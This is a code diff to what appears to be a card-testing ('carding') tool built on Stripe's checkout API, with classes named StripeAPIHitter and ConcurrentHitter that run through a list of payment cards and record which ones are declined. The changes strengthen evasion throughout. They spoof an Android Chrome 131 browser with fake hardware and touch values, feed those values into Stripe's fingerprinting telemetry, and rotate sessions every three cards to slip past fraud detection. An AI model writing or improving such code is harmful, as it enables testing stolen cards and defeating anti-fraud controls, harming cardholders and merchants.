@@ -35,17 +35,21 @@ BATCH_DELAY = 5
 
 BROWSER_PROFILES = [
     {
-        "user_agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-        "impersonate": "chrome120",
+        "user_agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+        "impersonate": "chrome131_android",
         "platform": "Linux armv81",
         "color_depth": "24",
         "screen_height": "873",
         "screen_width": "393",
-        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        "device_memory": 8,
+        "hardware_concurrency": 8,
+        "max_touch_points": 5,
+        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
         "sec-ch-ua-mobile": "?1",
         "sec-ch-ua-platform": '"Android"'
     },
 ]
+CARDS_PER_SESSION = 3  # Rotate session every N cards
 
 STRIPE_DECLINE_CODES = {
     "generic_decline": "Card declined by issuer",
@@ -629,7 +633,7 @@ class StripeAPIHitter:
             return StripeAPIHitter._live_js_hash_cache
         try:
             import re as _re_hash
-            resp = cffi_requests.get("https://js.stripe.com/v3/", timeout=8, impersonate="chrome124")
+            resp = cffi_requests.get("https://js.stripe.com/v3/", timeout=8, impersonate="chrome131_android")
             if resp.status_code == 200:
                 text = resp.text[:5000]  # hash is in the header chunk
                 # Stripe.js exposes build hash in: e.p="https://js.stripe.com/v3/" or chunkId patterns
@@ -683,24 +687,27 @@ class StripeAPIHitter:
             _tel_src = "js-tokenize-inner-v3" if (is_pi or is_seti) else "checkout-inner-live-v3"
             payload = {
                 "v": 2,
-                "tag": "5.6.8_js_fp",
+                "tag": StripeAPIHitter._fetch_live_stripe_js_hash() + "_js_fp",
                 "src": _tel_src,
                 "a": {
                     "a": self.pk_live,
                     "b": landing_url,
                     "c": int(profile.get('color_depth', '24')),
-                    "d": f"{profile.get('screen_width', '1920')}x{profile.get('screen_height', '1080')}",
+                    "d": f"{profile.get('screen_width', '393')}x{profile.get('screen_height', '873')}",
                     "e": False,
                     "f": locale,
-                    "g": profile.get('platform', 'Win32'),
+                    "g": profile.get('platform', 'Linux armv81'),
                     "h": profile['user_agent'],
                     "i": tz_offset,
                     "j": False,
-                    "k": 8,
-                    "l": 8,
+                    "k": profile.get('hardware_concurrency', 8),
+                    "l": profile.get('device_memory', 8),
                     "m": "",
                     "n": "",
-                    "o": ""
+                    "o": "",
+                    "p": profile.get('max_touch_points', 5),
+                    "q": 0.85,
+                    "r": "portrait-primary"
                 }
             }
             loop = asyncio.get_event_loop()
@@ -1793,17 +1800,24 @@ class ConcurrentHitter:
         if self.update_callback:
             await self.update_callback({"status": "starting", "url_info": self.url_info})
             
-
-            
-        shared_session = cffi_requests.Session(impersonate=self._stripe_profile["impersonate"])
+        current_session = None
         try:
             for idx, card in enumerate(self.cards[:MAX_ATTEMPTS]):
                 if not self.is_running:
                     break
                 
+                # Rotate session every CARDS_PER_SESSION cards
+                if idx % CARDS_PER_SESSION == 0:
+                    if current_session:
+                        try:
+                            current_session.close()
+                        except Exception:
+                            pass
+                    current_session = cffi_requests.Session(impersonate=self._stripe_profile["impersonate"])
+                
                 attempt_num = idx + 1
                 try:
-                    await self._process_single_card(card, attempt_num, session=shared_session)
+                    await self._process_single_card(card, attempt_num, session=current_session)
                 except Exception as e:
                     import traceback
                     print(f"DEBUG: Processing card failed: {e}\n{traceback.format_exc()}")
@@ -1811,10 +1825,11 @@ class ConcurrentHitter:
                 if not self.is_running:
                     break
         finally:
-            try:
-                shared_session.close()
-            except Exception:
-                pass
+            if current_session:
+                try:
+                    current_session.close()
+                except Exception:
+                    pass
             
         if self.update_callback:
             await self.update_callback({"status": "completed", "successes": self.successes, "fails": self.fails})
